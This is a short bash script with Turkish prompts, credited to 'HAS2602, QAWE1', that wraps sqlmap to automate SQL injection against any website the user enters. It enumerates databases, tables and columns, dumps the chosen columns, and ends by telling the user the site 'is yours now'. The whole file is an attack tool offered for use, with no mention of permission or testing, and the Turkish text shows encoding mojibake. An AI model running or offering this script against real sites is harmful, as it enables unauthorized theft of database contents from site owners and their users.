#!/bin/bash

echo -e '\e[36m â›  
   .aMMMb dMMMMMMP .aMMMb  .dMMMb  .aMMMb  dMP     dMMMMMMMMb  .aMMMb  dMMMMb 
  dMP"dMP   dMP   dMP"dMP dMP" VP dMP"dMP dMP     dMP"dMP"dMP dMP"dMP dMP.dMP 
 dMP dMP   dMP   dMP dMP  VMMMb  dMP.dMP dMP     dMP dMP dMP dMMMMMP dMMMMP"  
dMP.aMP   dMP   dMP.aMP dP .dMP dMP.MMP dMP     dMP dMP dMP dMP dMP dMP       
VMMMP"   dMP    VMMMP"  VMMMP"  VMMP"MPdMMMMMP dMP dMP dMP dMP dMP dMP         
MADE BY HAS2602, QAWE1
 â™ª\e[0m'

read -p "Taramak istediÄŸin site URL'sini giriniz: " url

echo "$url database'i taranÄ±yor, soru gelirse 'y' de ve enterla :)..."
sqlmap -u "$url" --dbs

read -p "Database tarandÄ±, Ã§Ä±kan database adÄ±nÄ± yazÄ±nÄ±z: " data

sqlmap -u "$url" -D "$data" --tables

echo "Tablolar Ã§ekiliyor, bekleyiniz, soru gelirse 'y' yazÄ±p enterla..."

read -p "Tablolar Ã§ekildi, girmek istediÄŸin tablo adÄ±nÄ± yaz: " table

echo "Ã‡ekiliyor, bekleyiniz..."
sqlmap -u "$url" -D "$data" -T "$table" --columns

echo "Columnlar Ã§ekildi, sonuÃ§lar yukarÄ±daki gibi dostum"

read -p "Åimdi ise columnlarÄ± gir, dump ediyorum :)" columnske

sqlmap -u "$url" -D "$data" -T "$table" -C "$columnske" --dump

echo "Aferim, site artÄ±k senindir dostum!"